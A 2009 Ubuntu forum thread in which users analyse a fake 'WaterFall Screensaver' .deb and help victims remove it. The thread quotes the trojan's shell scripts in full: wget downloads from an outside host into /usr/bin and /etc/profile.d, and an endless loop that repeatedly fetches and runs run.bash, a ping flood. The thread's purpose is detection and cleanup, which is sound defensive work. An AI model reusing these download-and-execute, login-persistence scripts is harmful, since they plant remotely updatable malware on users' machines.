---
title: "YOU THERE!! Malicios script installed as a DEB, please read!"
date: 2009-12-08
forum: General Help
---

### Post by conorsulli on 2009-12-08
Hello guys Im going to make this breef

I have installed a deb from a site claiming to be an Screensaver however it looked dodgy however I proceeded.

after I looked into the source I found MYSTERIOS ACTIVITY FOR WHAT SHOULD BE A SCREENSAVER... IS THIS REQUIRED? (below)
(also no screensaver was ever shown in gnome-screensaver)

#!/bin/sh
cd /usr/bin/
rm Auto.bash
sleep 1
wget [noparse]http://05748.t35.com/Bots/Auto.bash[/noparse]
chmod 777 Auto.bash
echo -----------------
cd /etc/profile.d/
rm gnome.sh
sleep 1
wget [noparse]http://05748.t35.com/Bots/gnome.sh[/noparse]
chmod 777 gnome.sh
echo -----------------
clear
exit


Im no expert but this looks just wrong!!

I have removed the package however I i doubt this has done much good...

Please help, comments exist from other users who have downloaded this file not understanding why their screensaver did not show up and probably left the file installed.

This all just litterally happened in the last few minutes and im affraid to reboot my computer.. should I reinstall my gnome packages?

Or was I just being paranoid? Im thinking I should contact the other users who have downloaded the file and request the file be pulled if it is in fact some attack...

Sorry for sounding strange, Just trying to fix this A.S.A.P.

Thank you for any suggestions.

---

### Post by lownox on 2009-12-08
Excuse my noobishness, but it appears that the DEB replace those two files and changed the permission level to 777.  I would be curious to see the contents of the two files to see what they are trying to do.  It does appear you have clicked when you should have clacked though.  ;)

---

### Post by MooPi on 2009-12-08
What is the link(url) for this alleged screensaver
 Please not as hyper link but plain text.

---

### Post by doas777 on 2009-12-08
definitely not a screensaver. I looked at some of the scripts that it downloads and most of them are pretty simplistic, so no idea what it is trying to do, but I;m not seeing it do much. for instance the bash replacement seems to just ping a site "mmowned.com " or some such.

---

### Post by pbrane on 2009-12-08
This is the contents of the Auto.bash script.

```
while :
do
rm /usr/bin/run.bash
cd /usr/bin/
wget http://05748.t35.com/Bots/index.php
wget http://05748.t35.com/Bots/run.bash
sleep 4
rm index.php
chmod 755 run.bash
command -p /usr/bin/run.bash
done

```

you may want to se if run.bash is running. if so kill it. And then remove it from /usr/bin/

gnome.sh runs Auto.bash

Also you can whois mmowned.com and complain to the hosting company. Interesting I just looked up the hosting company and they advertise protection against DOS attacks.

---

### Post by imbjr on 2009-12-08
> **conorsulli said:**
> 
#!/bin/sh
cd /usr/bin/
rm Auto.bash
sleep 1
wget [http://05748.t35.com/Bots/Auto.bash](http://05748.t35.com/Bots/Auto.bash)
chmod 777 Auto.bash
echo -----------------
cd /etc/profile.d/
rm gnome.sh
sleep 1
wget [http://05748.t35.com/Bots/gnome.sh](http://05748.t35.com/Bots/gnome.sh)
chmod 777 gnome.sh
echo -----------------
clear
exit


Ultimately this seems to be happening:
ping -s 65507 [www.mmowned.com](www.mmowned.com)
which may happen everytime you log in - plus it seems designed to keep what it can run updated.

There's a php file involved too, but I cannot figure out what part that has to play.

I think you may have just been PWNED.

---

### Post by conorsulli on 2009-12-08
OK guys please help me remove from gnome-look this file i have browsed the source codes and it contains something definatley malicious

[http://www.gnome-look.org/content/show.php/WaterFall+Screensaver?content=116772](http://www.gnome-look.org/content/show.php/WaterFall+Screensaver?content=116772)

please dont install it

im working on contacting others who have installed it and redirecting them here to resolve the issue

---

### Post by conorsulli on 2009-12-08
yes noticed this after further looking... :-(

gonna get this guy good

---

### Post by Enlightened Shadow on 2009-12-08
OMG I installed this earlier today. It hasn't done anything to me yet please tell me how to remove it!

---

### Post by akashiraffee on 2009-12-08
No, you're right.  Whatever goes into /etc/profile.d gets run everytime someone logs in.  It then downloads another script and runs that.  Right now, it is just
ping -s 65507 [www.mmowned.com]("http://www.mmowned.com")

which could at least be used to collect IP's, if this person is also responsible for mmowned.com.  Since this script could be replaced with something else at anytime, it could easily be used to use your computer to assist in a "Denial of Service" attack.

I'm not an expert on stuff like that either, but it certainly is not an innocent thing to do.  As you guess, it probably is intended to be forgotten quickly as just "not working".

---

### Post by pbrane on 2009-12-08
this is from my earlier post just in case...

**Also you can whois mmowned.com and complain to the hosting company. Interesting I just looked up the hosting company and they advertise protection against DOS attacks.**

---

### Post by akashiraffee on 2009-12-08
> **Enlightened Shadow said:**
> OMG I installed this earlier today. It hasn't done anything to me yet please tell me how to remove it!

Go check /etc/profile.d and see if there is a "gnome.sh" there (a deceptive name!).  If it is, post it here.

It probably is not intended to do any harm to your system if it is for DoS stuff, but it could actually be for anything.

---

### Post by MooPi on 2009-12-08
What scares me is the fact that I've used GTK themes from this link before. Owners need to police content!

---

### Post by akashiraffee on 2009-12-08
> **pbrane said:**
> this is from my earlier post just in case...

**Also you can whois mmowned.com and complain to the hosting company. Interesting I just looked up the hosting company and they advertise protection against DOS attacks.**

mmowned.com could just as easily be a target, or a distraction.

The real bad guy is this one:
[noparse]http://05748.t35.com[/noparse]

---

### Post by akashiraffee on 2009-12-08
> **MooPi said:**
> What scares me is the fact that I've used GTK themes from this link before. Owners need to police content!

The owner could not have been mistaken about the fact that that was not a screensaver.

GTK themes are easy to write and might make a good trojan horse here, I'm still betting they are DoS wannabes.

---

### Post by conorsulli on 2009-12-08
[noparse]http://www.mmowned.com/forums/wow-scams/228194-wow-phishing-pack.html[/noparse]

Look here guys

Turns out it is a WoW fanboy... most important thing is to get the identity of this person and pull down the file

he refers to the link in here.. of [noparse]http://05748.t35.com/[/noparse] script thing

---

### Post by Enlightened Shadow on 2009-12-08
> **akashiraffee said:**
> Go check /etc/profile.d and see if there is a "gnome.sh" there (a deceptive name!).  If it is, post it here.

It probably is not intended to do any harm to your system if it is for DoS stuff, but it could actually be for anything.


Well it's too late for that now. I'm afraid that I just deleted that file. I hope I didn't mess up.

---

### Post by Dark_Stang on 2009-12-08
Nobody has said it yet, so I'm going to... A screen saver? Do people still use those?

---

### Post by conorsulli on 2009-12-08
> **akashiraffee said:**
> Go check /etc/profile.d and see if there is a "gnome.sh" there (a deceptive name!).  If it is, post it here.

It probably is not intended to do any harm to your system if it is for DoS stuff, but it could actually be for anything.

*all gnome.sh contains is*

**/usr/bin/Auto.bash &**

---

### Post by snova on 2009-12-08
Concerning.

The .deb should be safe to remove through standard tools. There is a postrm script, but it's apparently harmless:

```

#!/bin/sh
set -e
# Automatically added by dh_makeshlibs
if [ "$1" = "remove" ]; then
        ldconfig
fi
# End automatically added section

```

Delete these:

/usr/bin/Auto.bash
/usr/bin/run.bash
/etc/profile.d/gnome.sh

Make sure none of them are still running either. It seems to only trigger when gnome.sh is run.

I sent an email through gnome-look.org's Report Abuse link.

---

### Post by Enlightened Shadow on 2009-12-08
The point is that I was dumb enough to think that Ubuntu was secure enough out here in the Linux wonderland that I love so much that I ended up on gnome-look downloading everything that looked cool without examining everything first.

---

### Post by LuisGMarine on 2009-12-08
> **Enlightened Shadow said:**
> OMG I installed this earlier today. It hasn't done anything to me yet please tell me how to remove it!

lol 0wned! :popcorn:

---

### Post by Enlightened Shadow on 2009-12-08
> **snova said:**
> Concerning.

The .deb should be safe to remove through standard tools. There is a postrm script, but it's apparently harmless:

```

#!/bin/sh
set -e
# Automatically added by dh_makeshlibs
if [ "$1" = "remove" ]; then
        ldconfig
fi
# End automatically added section

```Delete these:

/usr/bin/Auto.bash
/usr/bin/run.bash
/etc/profile.d/gnome.sh

Make sure none of them are still running either. It seems to only trigger when gnome.sh is run.

I sent an email through gnome-look.org's Report Abuse link.


I deleted both usr/bin/auto.bash
and etc/profile.d/gnome.sh
However the run.bash was not there at all.

---

### Post by conorsulli on 2009-12-08
> **LuisGMarine said:**
> lol 0wned! :popcorn:

i know.........

---

### Post by akashiraffee on 2009-12-08
> **Enlightened Shadow said:**
> Well it's too late for that now. I'm afraid that I just deleted that file. I hope I didn't mess up.

That is evidence that it was working, because I do not think there  is  a legitimate "gnome.sh".

> **conorsulli said:**
> 
 Turns out it is a WoW fanboy... most important thing is to get the identity of this person and pull down the file


There is not a clear connection between this person and [noparse]http://05748.t35.com/[/noparse]; they have different IP addresses.  

However, he does appear to download lil' script packs as well, and is a ubuntu user...somebody should register for the site and investigate, I guess.  And of course phishing is very bad.

---

### Post by imbjr on 2009-12-08
[noparse]http://05748.t35.com/[/noparse]

That's just a convenient holding bucket, probably another innocent party.

---

### Post by pbrane on 2009-12-08
mtr 05748.t35.com comes up with a couple of IPs that all point to Interserver, Inc.

you can report abuse to them at [email]abuse@trouble-free.net[/email] if you want.

---

### Post by snova on 2009-12-08
> **Enlightened Shadow said:**
> I deleted both usr/bin/auto.bash
and etc/profile.d/gnome.sh
However the run.bash was not there at all.

That is good, it isn't downloaded until it runs.

> **akashiraffee said:**
> That is evidence that it was working, because I do not think there  is  a legitimate "gnome.sh".

Nowhere in official repos at least:

```

$ apt-file search /etc/profile.d
gvfs-bin: /etc/profile.d/gvfs-bash-completion.sh
speech-dispatcher: /etc/profile.d/speechd-user-port.sh

```

It's gone from gnome-look.org already. That was quick...

---

### Post by hwttdz on 2009-12-08
Yup, looks like a DDOS (distributed denial of service) setup.  A bunch of computers repeatedly pinging an address can possibly bring down a server.  It seems unlikely and naieve, as a clever ip address will either deny pings or deny repeated pings from the same address.  They can point the gun at whoever they will by changing the ip address, currently pointed at the world of warcraft site.

Also, all I have in my /etc/profile.d/ is gvfs-bash-completion.sh and speechd-user-port.sh of which only the first has execute permissions (probably due to me disabling user accessibility features).  So if you have other crazy nonsense there you can dump it.  Of course the easy way would be to look at when the file was created and just delete recent stuff.  

I'm suggesting something like 

find /etc/profile.d/ -mtime 2 | xargs -n 1 sudo rm -i

---

### Post by conorsulli on 2009-12-08
> **imbjr said:**
> [noparse]http://05748.t35.com/[/noparse]

That's just a convenient holding bucket, probably another innocent party.

Ok, my mistake however both users are into shady stuff... Ill investigate further

---

### Post by NoaHall on 2009-12-08
Thank you for bring this to our intentions. A lesson should be learned - if you install .deb files not from reliable sources(official PPA's), don't be surprised if it causes damage. Fortunately, this is a fairly low end attack(for you the user) - they could have done much worse. However, this is a attack on websites commonly used on Windows, otherwise known as DDoS attacks. They bring websites to a halt, so from a website owners view, these are dangerous attacks.

Anyway, I hope this problem has been sorted for you. Perhaps you should consider setting up a firewall - to monitor activity, if nothing else.

---

### Post by lisati on 2009-12-08
> **pbrane said:**
> This is the contents of the Auto.bash script.

```
while :
do
rm /usr/bin/run.bash
cd /usr/bin/
wget http://05748.t35.com/[COLOR="Red"]Bots[/COLOR]/index.php
wget http://05748.t35.com/[COLOR="Red"]Bots[/COLOR]/run.bash
sleep 4
rm index.php
chmod 755 run.bash
command -p /usr/bin/run.bash
done

```

you may want to se if run.bash is running. if so kill it. And then remove it from /usr/bin/

gnome.sh runs Auto.bash

Also you can whois mmowned.com and complain to the hosting company. Interesting I just looked up the hosting company and they advertise protection against DOS attacks.

I've highlighted in red the part of the script which caught my attention. Anyone checked what would actually get downloaded via wget?

---

### Post by doas777 on 2009-12-08
> **conorsulli said:**
> [noparse]http://www.mmowned.com/forums/wow-scams/228194-wow-phishing-pack.html[/noparse]

Look here guys

Turns out it is a WoW fanboy... most important thing is to get the identity of this person and pull down the file

he refers to the link in here.. of [noparse]http://05748.t35.com/[/noparse] script thing

that is a very interesting thread. the very definition of script kiddies.

it appears that the guy is giving out phishing impersonation pages, and telling folks to host them on t35 and 110mb. my guess is that this script is designed to show one of the phishing pages when the user calls up a specific url (probably that index.php file that is downloaded via the auto.bash script). the gnome.sh just launches it at boot. 

my guess is that the ping is designed to somehow boost the phishers reputation on the mmowned forums.

---

### Post by NoaHall on 2009-12-08
Yes -


Php file -
```
<!-- T35 Hosting Ad Code Begin --> 
<style type="text/css"> 
#t35ad{font: 14px  arial,helvetica; text-decoration: none; line-height:1.5em; text-align: center; }
#t35ad a{font: 14px  arial,helvetica; text-decoration: none; }
#t35ad a:hover{background-color: black; color: white; font-size:medium; font-weight: bold; }
#t35ad ul{display: inline; list-style-type: none; padding: 0;}
#navlist li{display: inline; list-style-type: none; padding-right: 0px; padding-left: 0px; padding: 0;}
</style> 
<script type="text/javascript" charset="utf-8"> 
  var redvase_ad = { version: 1.5 };
  redvase_ad.publisher = 't35';
  redvase_ad.kind      = 't35_footer_prem';
  redvase_ad.content   = 'creative'
  </script> 
<script src="http://redvase.bravenet.com/javascripts/redvase.js" type="text/javascript" charset="utf-8"></script> 
<!-- T35 Hosting Ad Code End --> 
 
</noscript></noframes> 
<!-- T35 Hosting Ad Code Begin --> 
<!-- Start of Stat Code --> 
<img src="http://c11.statcounter.com/1120767/0/78e6f3a5/1/" width="1" height="1" alt="stats" border="0" /> 
<script type="text/javascript"> 
_qoptions={
qacct:"p-f2Rp-GHnsAESA"
};
</script><script type="text/javascript" src="http://edge.quantserve.com/quant.js"></script> 
<noscript><img src="http://pixel.quantserve.com/pixel/p-f2Rp-GHnsAESA.gif" style="display: none;" border="0" height="1" width="1" alt="Quantcast"/></noscript> 
<!-- End of Stat Code --> 
<div id="t35ad" align="center" style="display:block;"> 
<br/>Hosted by <a target="_blank" href="http://www.t35.com/">T35 Free Web Hosting</a>.
<a target=_blank href=http://www.saharamakeup.co.uk/>Indian Bridal Makeup</a>&nbsp;-&nbsp;<a target=_blank href=http://www.hypercasinos.com/component/option,com_jreviews/Itemid,28/>Casino Reviews</a>&nbsp;-&nbsp;<a target=_blank href=http://www.www.mckennavw.com/>VW Los Angeles</a>&nbsp;-&nbsp;<a target="_blank" href="http://www.drugrehabcenter.com/">Drug Rehab</a>&nbsp;-&nbsp;<a target=_blank href=http://www.bestonlinecollegesdegrees.com/college-degrees-online.html>Online Degree</a>&nbsp;-&nbsp;<a target=_blank href=http://www.uk-cheapest.co.uk>Domains</a>&nbsp;-&nbsp;<a target=_blank href=http://www.fashiondrops.com/>Prada Shoes</a>&nbsp;-&nbsp;<a target=_blank href=http://www.thelabdesign.com/organic-seo.html>SEO Los Angeles</a> 
</div>
```

And
Bash-
```
ping -s 65507 www.mmowned.com
```

---

### Post by doas777 on 2009-12-08
> **lisati said:**
> I've highlighted in red the part of the script which caught my attention. Anyone checked what would actually get downloaded via wget?

the run.bash is pretty minimal (just a ping, albeit a large one), but I haven't been able to get a look at the php file without rendering it. I'm pretty sure that it is a phishing knock-off site.

EditL:
@Noa, it looks like your noscripts removed a crucial part of the page. all that is there is advertising links, and a call to a javascript for alexa and quantserv.

---

### Post by conorsulli on 2009-12-08
what Im worried about is the rm commands, it suggests that these containers were in use already!

to be sure could someone who has not installed the rogue deb check if these files exist already? the could be needed for something

:-(

---

### Post by hwttdz on 2009-12-08
For me (not silly enough to hand out root): "ls /usr/bin/Auto.bash /usr/bin/run.bash /etc/profile.d/gnome.sh"
returns 
ls: cannot access /usr/bin/Auto.bash: No such file or directory
ls: cannot access /usr/bin/run.bash: No such file or directory
ls: cannot access /etc/profile.d/gnome.sh: No such file or directory

You should be good getting rid of all of them.

To remove bad files:
"rm /usr/bin/Auto.bash /usr/bin/run.bash /etc/profile.d/gnome.sh"

---

### Post by doas777 on 2009-12-08
> **conorsulli said:**
> what Im worried about is the rm commands, it suggests that these containers were in use already!

to be sure could someone who has not installed the rogue deb check if these files exist already? the could be needed for something

:-(

probably not.
it's pretty standard whenever you create a file that might already exists, to remove the original first. if there is no file to remove, it succeeds without error, but if it is there, it clears the way for the new version.

whenever I write a sql create script, I always start by checking for the existing object, and removing it prior to running the create. it's easier than packaging it as one create script and another alter one.

---

### Post by snova on 2009-12-08
> **doas777 said:**
> EditL:
@Noa, it looks like your noscripts removed a crucial part of the page. all that is there is advertising links, and a call to a javascript for alexa and quantserv.

I downloaded it with wget; it looks the same.

> **conorsulli said:**
> what Im worried about is the rm commands, it suggests that these containers were in use already!

to be sure could someone who has not installed the rogue deb check if these files exist already? the could be needed for something

:-(

None of these filenames are used anywhere else. I think it's just a sanity check, or maybe so it can be updated.

---

### Post by pbrane on 2009-12-08
They don't exist on my machine. checked that earlier.

---

### Post by NoaHall on 2009-12-08
This is what is located at the javascript file -
```
/*
RedVase, version 1.6
(c) Copyright 2007 Bravenet Media Network. All Rights Reserved.
*/

if (!Array.prototype.push) {
  // implements Array.push since this may not be available
  Array.prototype.push = function() {
    var al = arguments.length; var l = this.length;
    for ( var i = 0; i < al; ++i ) {
      this[l+i] = arguments[i];
    }
    return this.length;
  };
}

if ( typeof(RedVase) == 'undefined' ) {
  var RedVase = (function() {
    var _url_base = 'http://redvase.bravenet.com';
    var _page_ads = [];

    // converts ad hash into url
    function _to_url(ad) {
      var url = [ _url_base ];
      var query_string = [ ];

      // construct base url
      url.push((ad.content == 'html' || ad.content == 'iframe' ? 'creative' : ad.content)); delete ad.content;
      url.push(ad.publisher); delete ad.publisher;
      url.push(ad.kind); delete ad.kind;
      if (ad.alternate) { url.push(ad.alternate); delete ad.alternate; }

      // append the iframe formats if needed
      if (ad.format) { 
        var matches = ad.format.match(RedVase.FORMAT_REGEX)
        query_string.push('ifh=' + matches[1]);
        query_string.push('ifw=' + matches[2]);
        delete ad.format; 
      }

      // append randomizer
      query_string.push('r=' + (ad.random || new Date().getTime()))
      if (ad.random) { delete ad.random; }

      // unshift any other params so randomizer is last
      for (var key in ad) {
        if (typeof(ad[key]) == 'string') query_string.unshift([key] + '=' + ad[key]);
      }

      return url.join('/') + '?' + query_string.join('&');
    }

    // injects the ad onto the document
    function _show(ad) {
      document.writeln('<script src="' + _to_url(ad) + '" type="text/javascript" charset="utf-8"><\/script>');
    }

    // shortcut method
    function _record_and_show(ad) {
      _page_ads.push(ad);
      _show(ad);
    }

    // converts options hash to attribute string
    function _to_pop_options(hash) {
      if (typeof hash == 'string') return hash;
      var result = [];
      for (var key in hash) {
        result.push(key+'='+hash[key]);
      }
      return result.join(',');
    }

    return {
      placement: function(block) {
        var ad = {};
        block(ad);
        if ((new RedVase.Sanitizer(ad)).check()) {
          _record_and_show(ad);
        }
      },
      show_popunder: function(url, name, options) {
        if (!url) throw "required url missing";
        name = name || '_blank';
        options = _to_pop_options(options || {});
        return window.open(url, name, options);
      }
    };
  })();

  RedVase.FORMAT_REGEX = /(\d+)x(\d+)/;
  RedVase.Sanitizer = function(ad) {
    this.ad = ad;
    this.sane = true;
  };
  RedVase.Sanitizer.prototype  = {
    update: function(result) {
      if (this.sane && !result) {
        this.sane = false;
      }
      return result;
    },
    assert_exists: function(flag) {
      return this.update(flag);
    },
    assert_string: function(flag, allow_undefined) {
      if (typeof(allow_undefined) === 'undefined') allow_undefined = false;
      return (allow_undefined || this.update(this.assert_exists(flag)) && typeof(flag) == 'string');
    },
    assert_content: function(flag) {
      if (flag != 'html' && flag != 'pop' && flag != 'iframe') {
        flag = 'html';
      }
      return flag;
    },
    assert_format: function(flag, allow_undefined) {
      if (typeof(allow_undefined) === 'undefined') allow_undefined = false;
      if (typeof(flag) === 'undefined' && allow_undefined) return null;
      
      if ( this.update( this.assert_string(flag, true) && RedVase.FORMAT_REGEX.test(flag) ) ) {
        return flag.match(RedVase.FORMAT_REGEX)[0];
      }
      return null;
    },
    check: function() {
      var ad = this.ad;
      // make sure ad.content is set
      ad.content = this.assert_content(ad.content);
      this.assert_string(ad.publisher);
      this.assert_string(ad.kind);
      this.assert_string(ad.alternate, true);
      ad.format = this.assert_format(ad.format, true);
      if (ad.format === null) delete ad.format;
      return this.sane;
    }
  };
}

if (typeof(redvase_ad) != 'undefined') {
  (function(redvase_ad_var) {
      RedVase.placement(function(ad) {
      for (var k in redvase_ad_var) {
        ad[k] = redvase_ad_var[k];
      }
    });
  })(redvase_ad);
  redvase_ad = null;
}
```

Just for ads, as far as I can tell.

---

### Post by Cycron on 2009-12-08
I INSTALLED THE STUPID DEB FILE A FEW HOURS AGO... WHAT DO I DO TO GET RID OF IT??? HELP!!! Quit talking... wheres the solution... is this thing gonna do anything to harm my computer???:( ???????????????????????????????????????????????????

---

### Post by pbrane on 2009-12-08
> **doas777 said:**
> the run.bash is pretty minimal (just a ping, albeit a large one), but I haven't been able to get a look at the php file without rendering it. I'm pretty sure that it is a phishing knock-off site.

EditL:
@Noa, it looks like your noscripts removed a crucial part of the page. all that is there is advertising links, and a call to a javascript for alexa and quantserv.

Looks like its complete. index.php is the web page of 05748.t35.com

---

### Post by NoaHall on 2009-12-08
```
sudo rm -f /usr/bin/Auto.bash /usr/bin/run.bash /etc/profile.d/gnome.sh index.php run.bash
```
Run that in the terminal.

---

### Post by doas777 on 2009-12-08
redvase.js is just a counter for the alexa advertising/stat platform. very common. same with the quantserv script.

the real payload should be between these tags:
```
<!-- T35 Hosting Ad Code End --> 
 
</noscript></noframes> 
<!-- T35 Hosting Ad Code Begin --> 

```all the rest of the code is from a t35 template, which is designed so that the specific page desired is rendered between the tags, probably via frames. noscript blocked the frame from running at all, as close as I can tell.

that or this kid forgot to load any content pages. that is a possibility.

---

### Post by hwttdz on 2009-12-08
Beat to the punch.

---

### Post by pbrane on 2009-12-08
> **Cycron said:**
> I INSTALLED THE STUPID DEB FILE A FEW HOURS AGO... WHAT DO I DO TO GET RID OF IT??? HELP!!! Quit talking... wheres the solution... is this thing gonna do anything to harm my computer???:( ???????????????????????????????????????????????????

remove it using **apt-get --purge remove 116772-WaterFall.deb**

or at least that was the name when it was up on gnome-look

---

### Post by sisco311 on 2009-12-08
> **conorsulli said:**
> what Im worried about is the rm commands, it suggests that these containers were in use already!

to be sure could someone who has not installed the rogue deb check if these files exist already? the could be needed for something

:-(

I'm worried about the fact that the run.bash script is downloaded from a server **every time** before it's executed. What if the script was changed?

Call me paranoid but I would backup my data and reinstall my OS.

---

### Post by Cycron on 2009-12-08
> **NoaHall said:**
> ```
sudo rm -f /usr/bin/Auto.bash /usr/bin/run.bash /etc/profile.d/gnome.sh
```Run that in the terminal.
I just did that... is it OK now?? :?

---

### Post by NoaHall on 2009-12-08
Well, for the time being. What was the output from it?

Also, you may want to run ```
sudo apt-get --purge remove 116772-WaterFall.deb
```

---

### Post by doas777 on 2009-12-08
> **Cycron said:**
> I just did that... is it OK now?? :?

paranoia is best. when in doubt, quarentine your files for backup, rebuild, and be very careful what files out of your backup that you choose to restore.

---

### Post by Cycron on 2009-12-08
there was no output... it just went right back to the place to enter another command.

---

### Post by NoaHall on 2009-12-08
> **Cycron said:**
> there was no output... it just went right back to the place to enter another command.

That means it worked :) Now run the other command, and post the output.

---

### Post by Cycron on 2009-12-08
Reading package lists... Done
Building dependency tree       
Reading state information... Done
E: Couldn't find package 116772-WaterFall.deb

---

### Post by NoaHall on 2009-12-08
> **Cycron said:**
> Reading package lists... Done
Building dependency tree       
Reading state information... Done
E: Couldn't find package 116772-WaterFall.deb

Can you find the .deb file for me and post its name? Also, run this - ```
apt-cache search Water
```

---

### Post by Cycron on 2009-12-08
> **NoaHall said:**
> Can you find the .deb file for me and post its name? Also, run this - ```
apt-cache search Water
```
What happens when I enter: apt-cache search Water
```
texlive-latex-extra - TeX Live: LaTeX supplementary packages
watershed - reduce superfluous executions of idempotent command
boson - core package for Boson
boson-data - Datas for Boson, a real-time strategy game
boson-music - Music Pack for Boson, a real-time strategy game
bwbasic - Bywater BASIC Interpreter
chiark-utils-bin - chiark system administration utilities
dict-gazetteer2k-counties - Counties Database for the 2000 US Gazetteer
dict-gazetteer2k-places - Places Database for the 2000 US Gazetteer
dict-gazetteer2k-zips - ZIP and ZCTA database for the 2000 US Gazetteer
empire - the war game of the century
enscribe - convert images into sounds
fillets-ng - puzzle game about witty fish saving the world sokoban-style
fillets-ng-data - docs, graphics, music and international sounds for fillets-ng
fillets-ng-data-cs - add-on sounds for czech language spoken dialogs for fillets-ng
ggz-game-servers - GGZ Gaming Zone: game servers collection
ggz-kde-games - GGZ Gaming Zone: game clients collection for KDE
gravitywars - clone of Gravity Force
gwaterfall - View all characters of a font in all sizes
hedgewars - Worms style game
icebreaker - Break the iceberg
libjgraph-java - JFC/Swing graph component for Java
libjgraph-java-doc - JFC/Swing graph component for Java (documentation)
libpixels-java - manipulation and filtering of images in Java
linpsk - Program for operating PSK31/RTTY modes with X GUI
luatex - next generation TeX engine
metacity-themes - Themes for the Gtk2 metacity window manager
pdftk - tool for manipulating PDF documents
pipenightdreams - connect pipes to get the water flowing from inlet to outlet
pipenightdreams-data - connect pipes to get the water flowing from inlet to outlet (data files)
snowdrop - plain text watermarking and watermark recovery
u++-doc - &#956;C++ Annotated Reference Manual
vodovod - puzzle game, you must lead the water to the storage tank
wise - comparison of biopolymers, commonly DNA and protein sequences
wmbubble - A system-load meter for Window Maker that features a duck
xdemorse - GTK+ Morse Code Decoding Software
xdesktopwaves - Simulation of water waves on the X Window System
zanshin - Todo List Manager
alien-arena - Standalone 3D first person online deathmatch shooter
alien-arena-browser - stand alone server browser for Alien Arena
alien-arena-data - Game data files for Alien Arena
alien-arena-server - Dedicated server for Alien Arena
fractxtra - Fractint extras collection
```

It is on my desktop... /home/raymond/Desktop.. and I tried cd Desktop then doing it and that gave the same result

---

### Post by akashiraffee on 2009-12-08
> **doas777 said:**
> probably not.
it's pretty standard whenever you create a file that might already exists, to remove the original first. if there is no file to remove, it succeeds without error, but if it is there, it clears the way for the new version.

Sure.  Except that is in an infinte while loop with a 4 second delay.  So it runs every four seconds, as long as you are logged in.

Nb, a php script generates output dynamically, what you get back from the server is not the script itself, it is the output.  You cannot see the actual source.   Your ip could easily be collected in this process, and this is to trigger some activity on the server in sequence with the "Auto.bash" infinite script.  

I have never thought about it much, but it does scream "DoS" to me.  You can go to jail for that (in the US) if the target complains and you get caught -- I would guess they are just doing it to each other for fun.

---

### Post by snova on 2009-12-08
Based on this excerpt from the control file:

```
Package: app5552
```

I'd say you should:

```
sudo dpkg -r app5552
```

---

### Post by NoaHall on 2009-12-08
> **Cycron said:**
> What happens when I enter: apt-cache search Water
```
texlive-latex-extra - TeX Live: LaTeX supplementary packages
watershed - reduce superfluous executions of idempotent command
boson - core package for Boson
boson-data - Datas for Boson, a real-time strategy game
boson-music - Music Pack for Boson, a real-time strategy game
bwbasic - Bywater BASIC Interpreter
chiark-utils-bin - chiark system administration utilities
dict-gazetteer2k-counties - Counties Database for the 2000 US Gazetteer
dict-gazetteer2k-places - Places Database for the 2000 US Gazetteer
dict-gazetteer2k-zips - ZIP and ZCTA database for the 2000 US Gazetteer
empire - the war game of the century
enscribe - convert images into sounds
fillets-ng - puzzle game about witty fish saving the world sokoban-style
fillets-ng-data - docs, graphics, music and international sounds for fillets-ng
fillets-ng-data-cs - add-on sounds for czech language spoken dialogs for fillets-ng
ggz-game-servers - GGZ Gaming Zone: game servers collection
ggz-kde-games - GGZ Gaming Zone: game clients collection for KDE
gravitywars - clone of Gravity Force
gwaterfall - View all characters of a font in all sizes
hedgewars - Worms style game
icebreaker - Break the iceberg
libjgraph-java - JFC/Swing graph component for Java
libjgraph-java-doc - JFC/Swing graph component for Java (documentation)
libpixels-java - manipulation and filtering of images in Java
linpsk - Program for operating PSK31/RTTY modes with X GUI
luatex - next generation TeX engine
metacity-themes - Themes for the Gtk2 metacity window manager
pdftk - tool for manipulating PDF documents
pipenightdreams - connect pipes to get the water flowing from inlet to outlet
pipenightdreams-data - connect pipes to get the water flowing from inlet to outlet (data files)
snowdrop - plain text watermarking and watermark recovery
u++-doc - &#956;C++ Annotated Reference Manual
vodovod - puzzle game, you must lead the water to the storage tank
wise - comparison of biopolymers, commonly DNA and protein sequences
wmbubble - A system-load meter for Window Maker that features a duck
xdemorse - GTK+ Morse Code Decoding Software
xdesktopwaves - Simulation of water waves on the X Window System
zanshin - Todo List Manager
alien-arena - Standalone 3D first person online deathmatch shooter
alien-arena-browser - stand alone server browser for Alien Arena
alien-arena-data - Game data files for Alien Arena
alien-arena-server - Dedicated server for Alien Arena
fractxtra - Fractint extras collection
```

It is on my desktop... /home/raymond/Desktop.. and I tried cd Desktop then doing it and that gave the same result

What's the name of the .deb file? 
Also, run the command provided by the other user.
Post the output of it.

---

### Post by Cycron on 2009-12-08
> **NoaHall said:**
> Can you find the .deb file for me and post its name? Also, run this - ```
apt-cache search Water
``` 
its called "116772-WaterFall.deb"

---

### Post by akashiraffee on 2009-12-08
A sure way to catch this if you are worried* would be to try:

ps -C wget

occasionally.  This will show you all the "wget" processes running.  There should not be any unless you have initiated one.

*after all, if this person is smart they could have scattered other trojan horse scripts around, and modified init.d scripts to start them :evil:

---

### Post by Cycron on 2009-12-08
> **NoaHall said:**
> What's the name of the .deb file? 
Also, run the command provided by the other user.
Post the output of it.

```
(Reading database ... 352354 files and directories currently installed.)
Removing app5552 ...
Processing triggers for libc-bin ...
ldconfig deferred processing now taking place

``` it took a while to read database

---

### Post by conorsulli on 2009-12-08
> **pbrane said:**
> remove it using **apt-get --purge remove 116772-WaterFall.deb**

or at least that was the name when it was up on gnome-look

That wont work unfortunatley its called **app5552**

                           **SOLUTION SO FAR**

1)the File is called **app5552** once installed... **so mark it for complete removal though synaptic**
2)It doesnt actually remove the scripts i think?

     **SO** finish off by
The manual way in a terminal:

**sudo rm -f /usr/bin/Auto.bash /usr/bin/run.bash /etc/profile.d/gnome.sh index.php run.bash**

enter your password

This will remove the rogue files.
this should get most of the problem solved for those wondering how to fix the issue.:KS

---

### Post by NoaHall on 2009-12-08
Right - it should be removed. It might also be a good idea to post the out of ```
cat /etc/apt/sources.list
```

---

### Post by Cycron on 2009-12-08
> **conorsulli said:**
> That wont work unfortunatley
1)the File is called app5552 once installed
2)It doesnt actually remove the scripts i think?

The manual way in a terminal:

**sudo rm -f /usr/bin/Auto.bash /usr/bin/run.bash /etc/profile.d/gnome.sh index.php run.bash**

enter your password


this should get most of the problem solved for those wondering how to fix the issue.:KS I did that... now what?

---

### Post by Cycron on 2009-12-08
> **NoaHall said:**
> Right - it should be removed. It might also be a good idea to post the out of ```
cat /etc/sources.list
```
```

cat: /etc/sources.list: No such file or directory

```

---

### Post by NoaHall on 2009-12-08
> **Cycron said:**
> ```

cat: /etc/sources.list: No such file or directory

```

Sorry, my mistake -
```
